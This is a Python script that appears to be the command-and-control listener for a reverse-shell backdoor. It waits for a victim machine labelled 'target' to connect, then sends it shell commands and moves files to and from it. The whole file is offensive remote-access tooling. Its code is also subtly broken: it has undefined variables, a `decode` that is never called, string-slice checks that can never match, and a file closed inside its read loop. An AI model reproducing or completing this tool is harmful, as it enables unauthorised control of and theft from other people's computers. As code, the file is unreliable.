import socket
import json
import os


def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ' '
    while True:
        try:
            data = data + target.recv(1024).decode.rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
        s.settimeout(None)
        f.close()

def target_communication():
    while True:
        command = input('* Shell~%s: ' %str(ip))
        reliable_send(command)
        if command == 'quit':
            break
        elif command[:3] == "cd ":
            pass
        elif command[:8] == 'download ' :
           download_file(command[9:])
        elif command[:6] == 'upload ' :
            upload_file(command[7:])
        else:
            result = reliable_recv()
            print(result)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("localhost",port))
print('[+] Listening For The Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()

